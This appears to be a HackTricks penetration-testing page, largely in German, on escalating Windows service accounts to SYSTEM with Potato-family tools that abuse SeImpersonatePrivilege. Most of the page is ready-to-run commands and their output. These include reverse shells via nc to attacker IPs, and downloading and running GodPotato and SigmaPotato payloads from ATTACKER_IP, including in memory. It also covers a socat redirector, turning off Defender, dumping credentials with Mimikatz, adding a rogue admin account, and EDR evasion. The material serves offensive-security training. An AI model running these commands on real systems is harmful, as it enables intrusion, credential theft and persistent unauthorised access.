# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** can be used to **leverage the same privileges and gain `NT AUTHORITY\SYSTEM`** level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.

> [!TIP]
> A modern alternative frequently maintained in 2024–2025 is SigmaPotato (a fork of GodPotato) which adds in-memory/.NET reflection usage and extended OS support. See quick usage below and the repo in References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Requirements and common gotchas

All the following techniques rely on abusing an impersonation-capable privileged service from a context holding either of these privileges:

- SeImpersonatePrivilege (most common) or SeAssignPrimaryTokenPrivilege
- High integrity is not required if the token already has SeImpersonatePrivilege (typical for many service accounts such as IIS AppPool, MSSQL, etc.)

Check privileges quickly:
```cmd
whoami /priv | findstr /i impersonate
```
Operational notes:

- Wenn Ihre Shell unter einem eingeschränkten Token ohne SeImpersonatePrivilege läuft (häufig bei Local Service/Network Service in manchen Kontexten), stellen Sie die Standardrechte des Kontos mit FullPowers wieder her und führen dann einen Potato aus. Beispiel: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer benötigt, dass der Print Spooler-Service läuft und über den lokalen RPC-Endpunkt (spoolss) erreichbar ist. In gehärteten Umgebungen, in denen Spooler nach PrintNightmare deaktiviert wurde, bevorzugen Sie RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato benötigt einen über TCP/135 erreichbaren OXID resolver. Wenn egress blockiert ist, verwenden Sie einen redirector/port-forwarder (siehe Beispiel unten). Ältere Builds benötigten das -f Flag.
- EfsPotato/SharpEfsPotato missbrauchen MS-EFSR; wenn eine Pipe blockiert ist, versuchen Sie alternative Pipes (lsarpc, efsrpc, samr, lsass, netlogon).
- Fehler 0x6d3 während RpcBindingSetAuthInfo deutet typischerweise auf einen unbekannten/nicht unterstützten RPC-Authentifizierungsdienst hin; versuchen Sie eine andere Pipe/Transport oder stellen Sie sicher, dass der Zielservice läuft.
- “Kitchen-sink” forks wie DeadPotato bündeln zusätzliche Payload-Module (Mimikatz/SharpHound/Defender off), die die Festplatte berühren; erwarten Sie eine höhere EDR-Erkennung im Vergleich zu den schlanken Originalen.

## Kurze Demo

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
- Du kannst -i verwenden, um einen interaktiven Prozess in der aktuellen Konsole zu starten, oder -c, um einen Einzeiler auszuführen.
- Erfordert den Spooler-Dienst. Wenn dieser deaktiviert ist, schlägt das fehl.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Wenn outbound 135 blockiert ist, pivoten Sie den OXID resolver über socat auf Ihrem redirector:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato ist ein neueres COM-Abuse-Primitiv, das Ende 2022 veröffentlicht wurde und den **PrintNotify**-Dienst anstelle des Spooler/BITS angreift. Das Binary instanziiert den PrintNotify COM-Server, setzt ein gefälschtes `IUnknown` ein und löst dann einen privilegierten Callback über `CreatePointerMoniker` aus. Wenn der PrintNotify-Dienst (der als **SYSTEM** läuft) zurückverbindet, dupliziert der Prozess das zurückgegebene Token und startet das übergebene Payload mit vollen Rechten.

Wichtige Betriebsnotizen:

* Funktioniert unter Windows 10/11 und Windows Server 2012–2022, solange der Print Workflow/PrintNotify-Dienst installiert ist (er ist auch vorhanden, wenn der legacy Spooler nach PrintNightmare deaktiviert wurde).
* Erfordert, dass der aufrufende Kontext über **SeImpersonatePrivilege** verfügt (typisch für IIS APPPOOL-, MSSQL- und geplante Aufgaben-Servicekonten).
* Akzeptiert entweder einen direkten Befehl oder einen interaktiven Modus, sodass Sie in der ursprünglichen Konsole bleiben können. Beispiel:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Da es rein COM-basiert ist, werden keine Named-Pipe-Listener oder externen Redirectors benötigt, was es zu einem Drop-in-Ersatz auf Hosts macht, auf denen Defender die RPC-Bindung von RoguePotato blockiert.

Operatoren wie Ink Dragon setzen PrintNotifyPotato unmittelbar nach dem Erlangen von ViewState RCE auf SharePoint ein, um vom `w3wp.exe`-Worker auf SYSTEM zu pivotieren, bevor sie ShadowPad installieren.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Tipp: Wenn eine pipe ausfällt oder EDR sie blockiert, versuche die anderen unterstützten pipes:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
- Funktioniert unter Windows 8/8.1–11 und Server 2012–2022, wenn SeImpersonatePrivilege vorhanden ist.
- Hole das Binary, das zur installierten Runtime passt (z. B. `GodPotato-NET4.exe` auf modernen Server 2022).
- Wenn deine initiale execution primitive eine webshell/UI mit kurzen Timeouts ist, stage den payload als Script und fordere GodPotato auf, ihn auszuführen, anstatt einen langen Inline-Befehl zu verwenden.

Schnelles Staging-Muster aus einem beschreibbaren IIS webroot:
```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```
### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato stellt zwei Varianten bereit, die Service-DCOM-Objekte anvisieren, die standardmäßig auf RPC_C_IMP_LEVEL_IMPERSONATE eingestellt sind. Kompiliere oder verwende die bereitgestellten binaries und führe deinen Befehl aus:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (aktualisierter GodPotato-Fork)

SigmaPotato fügt moderne Annehmlichkeiten hinzu, wie in-memory execution über .NET reflection und einen PowerShell reverse shell helper.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Zusätzliche Vorteile in den Builds 2024–2025 (v1.2.x):
- Eingebauter reverse shell-Flag `--revshell` und Aufhebung des 1024-Zeichen PowerShell-Limits, sodass du lange AMSI-bypassing Payloads auf einmal ausführen kannst.
- Reflection-freundliche Syntax (`[SigmaPotato]::Main()`), plus ein rudimentärer AV evasion Trick via `VirtualAllocExNuma()`, um einfache Heuristiken zu verwirren.
- Separate `SigmaPotatoCore.exe`, gegen .NET 2.0 kompiliert, für PowerShell Core-Umgebungen.

### DeadPotato (2024 GodPotato-Überarbeitung mit Modulen)

DeadPotato behält die GodPotato OXID/DCOM impersonation chain bei, integriert jedoch post-exploitation helpers, sodass Operatoren sofort SYSTEM übernehmen und persistence/collection durchführen können, ohne zusätzliche Tools.

Gängige Module (alle erfordern SeImpersonatePrivilege):

- `-cmd "<cmd>"` — startet einen beliebigen Befehl als SYSTEM.
- `-rev <ip:port>` — schnelle reverse shell.
- `-newadmin user:pass` — erstellt einen lokalen Admin für persistence.
- `-mimi sam|lsa|all` — legt Mimikatz ab und führt es aus, um Credentials zu dumpen (schreibt auf die Festplatte, auffällig).
- `-sharphound` — führt SharpHound collection als SYSTEM aus.
- `-defender off` — schaltet Defender Echtzeitschutz aus (sehr auffällig).

Beispiel-One-Liner:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Da es zusätzliche Binaries mitliefert, ist mit vermehrten AV/EDR-Alarmen zu rechnen; verwende die schlankeren GodPotato/SigmaPotato, wenn Stealth wichtig ist.

## Referenzen

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Standard-Token-Privilegien für Servicekonten wiederherstellen](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS-Junction zu webroot RCE → FullPowers + GodPotato zu SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [HTB: Job — LibreOffice-Makro → IIS-Webshell → GodPotato zu SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Enthüllung des Relay-Netzwerks und der internen Funktionsweise einer verdeckten Offensivoperation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [DeadPotato – GodPotato-Überarbeitung mit integrierten post-ex-Modulen](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
